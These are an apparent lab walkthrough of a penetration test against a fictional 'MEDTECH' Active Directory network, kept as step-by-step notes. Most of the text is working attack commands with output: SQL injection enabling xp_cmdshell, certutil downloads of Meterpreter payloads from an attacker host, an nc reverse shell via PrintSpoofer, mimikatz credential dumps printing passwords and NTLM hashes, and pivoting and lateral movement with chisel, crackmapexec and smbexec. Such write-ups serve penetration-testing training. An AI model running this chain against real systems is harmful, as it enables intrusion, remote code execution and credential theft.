# Questions
We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

# Machine
VM1 172.16.215.10
VM2 172.16.215.11
VM3 192.168.215.120 (WEB01.DMZ.MEDTECH.COM)
VM4 192.168.215.121 (WEB02.DMZ.MEDTECH.COM)
VM5 192.168.215.122 (VPN.DMZ.MEDTECH.COM)
VM6 172.16.215.12
VM7 172.16.215.13
VM8 172.16.215.14
VM9 172.16.215.82
VM10 172.16.215.83

# Nmap Public subnet network (192.168.xx.120-122)
sudo nmap -sC -sV -T4 192.168.215.120
# VM3 
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
# VM4
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
smb2-security-mode
 Message signing enabled but not required
# VM5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
1194/tcp open  openvpn

# Find any directory we can use
# VM3
gobuster dir -u http://192.168.215.120 -w /home/kali/Tools/dict/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.215.121/FUZZ -r
...
/about                (Status: 301) [Size: 44] [--> http://192.168.215.120/about/]
/static               (Status: 301) [Size: 46] [--> http://192.168.215.120/static/]
/assets               (Status: 301) [Size: 46] [--> http://192.168.215.120/assets/]
...
# VM4
gobuster dir -u http://192.168.215.121 -w /home/kali/Tools/dict/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.215.121/FUZZ -r

# None of the directory worth to go indepth, lets proceed to the MedTech Patient Portal that we found from Make an Appointment button. 
http://192.168.215.121/login.aspx

# Lets try with the weak password admin:admin Failed :D
# Lets try with BlindSQLi
UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
UsernameTextBox=1';RECONFIGURE;--
UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
UsernameTextBox=1';RECONFIGURE;--
UsernameTextBox=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.210:8088/met.exe C:\TEMP\met.exe";--
...
192.168.215.121 - - [28/May/2024 08:05:44] "GET /met.exe HTTP/1.1" 200 -
...
# Our https feedback with 200, means it is able to use SQLi!
# Lets listen to 8443 and establish the connection with VM3
UsernameTextBox=1';EXEC xp_cmdshell "cmd /c C:\TEMP\met.exe";--
# Go to the Metasplolit listener
C:\Windows\system32>whoami
nt service\mssql$sqlexpress
C:\Windows\system32>hostname
WEB02
# Now we identify the VM3 machine is WEB02

# Lets upload WinPEAS to check the machine
certutil.exe -urlcache -f http://192.168.45.206:8088/Windows/winPEASx64.exe C:/TEMP/winPEAS.exe
...
web.config found a password: WhileChirpTuesday218
...

cat web.config
```
<add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
```
# We have a SQL server credentials here

# But idk how to use HAHA, lets see the privilege that this user have
whoami /priv
...
SeAssignPrimaryTokenPrivilege Replace a process level token    Disabled
SeIncreaseQuotaPrivilege   Adjust memory quotas for a process     Disabled
SeChangeNotifyPrivilege   Bypass traverse checking                  Enabled 
SeManageVolumePrivilege  Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege   Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege  Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set    Disabled
...
# SeImpersonatePrivilege is enabled
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
# We can abuse it to get the NT AUTHORITY\SYSTEM level access
# Lets utilize one of the PrintSpoofer tools

PS C:\temp> iwr -uri http://192.168.45.206:8088/Windows/Priv-Esc/PrintSpoofer64.exe -Outfile Printspoof.exe
PS C:\temp> .\Printspoof.exe -c "C:\TEMP\nc.exe 192.168.45.206 1234 -e powershell"

# Go to listener
PS C:\Windows\system32> whoami
nt authority\system

# Lets try mimikatz.exe
PS C:\temp> iwr -uri http://192.168.45.177:8088/Windows/mimikatz.exe -Outfile mimi.exe
PS C:\temp> powershell -ep bypass
PS C:\temp> .\mimi.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
...
         * Username : Administrator
         * Domain   : WEB02
         * NTLM     : b2c03054c306ac8fc5f9d188710b0168
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
...
PS C:\Users\Administrator\Desktop> type proof.txt
a21cde38548900a820e8aeb8f25295f0

# Lets enable WEB02 for RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
xfreerdp /cert-ignore /u:joe /p:Flowers1 /v:192.168.233.121 /d:medtech.com +clipboard +drive:/home/kali/Desktop,/smb

# Extract Domain information using the PowerView.ps1
iwr -uri http://192.168.45.221:8088/Windows/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetUser -Domain medtech.com 
Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem
Get-NetGroup -Domain medtech.com| select name
Get-DomainGroupMember "Domain Admins" -Recurse


# Now we owned the joe:Flowers1 credentials, we can try the crackmapexec to find out what joe can access

# Before that lets establish the connection with WEB02 and dynamic port forward from WEB02 and allow KALI route to MEDTECH internal network

[Metasploit Dynamic Port Forwarding]
=====================================================
# Lets create a MSFpayload first
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.206 LPORT=8888 -f exe -o cute.exe

# Metasploit Dynamic Port Forwarding
https://github.com/twelvesec/port-forwarding?tab=readme-ov-file#SSH-Remote-Port-Forwarding
msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
set LHOST tun0
set LPORT 8888
set ExitonSession False

# WEB02
PS C:\TEMP> iwr -uri http://192.168.45.206:8088/cute.exe -Outfile cute.exe
PS C:\TEMP> .\cute.exe

# KALI
# While it had established the sessions, lets create a route first
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > run
[+] Route added to subnet 192.168.237.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.16.237.0/255.255.255.0 from host's routing table.

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1081
msf6 auxiliary(server/socks_proxy) > set VERSION 5

msf6 auxiliary(server/socks_proxy) > run -j

# Open new shell
sudo nano /etc/proxychains4.conf
...
socks5 127.0.0.1 1081
...
=====================================================

[Chisel Dynamic Port Forwarding]
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

./chisel server -p 8889 --reverseb --socks5
chisel client 192.168.45.221:8889 R:socks
# Open new shell
sudo nano /etc/proxychains4.conf
...
socks5 127.0.0.1 1080
...

# Lets try to access MEDTECH internal network
proxychains -q nmap -sT -Pn 172.16.237.10-14
proxychains -q nmap -sT -Pn 172.16.237.82-83
code targets.txt

# Crackmapexec 
https://notes.benheater.com/books/active-directory/page/crackmapexec
proxychains crackmapexec smb targets.txt -u joe -p 'Flowers1' -d medtech.com --continue-on-success
...
SMB         172.16.237.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.237.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.237.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.237.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.237.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.237.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.237.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.237.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.237.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.237.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.237.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
SMB         172.16.237.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
...

# Lets try smbexec
proxychains impacket-smbexec medtech/joe@172.16.237.11
Password: Flowers1
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>hostname
FILES02
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
d4f2fb85fba3a05acade0d8de3266f43

C:\Windows\system32> certutil.exe -urlcache -f http://192.168.45.206:8088/web02-cute.exe C:\Temp\cute.exe
C:\Windows\system32>C:\Temp\cute.exe

# Go to MSFConsole
sessions 3
meterpreter > shell
C:\Temp> Powershell
PS C:\TEMP> iwr -uri http://192.168.45.206:8088/Windows/mimikatz.exe -Outfile mimi.exe
mimikatz # privilege::debug
Privilege '20' OK
...
         * Username : Administrator
         * Domain   : FILES02
         * NTLM     : f1014ac49bae005ee3ece5f47547d185
...

# Lets find which server we can RDP
proxychains nmap -sT -Pn -p3389 -iL targets.txt
...
172.16.237.12:3389 OK
172.16.237.82:3389 OK
...


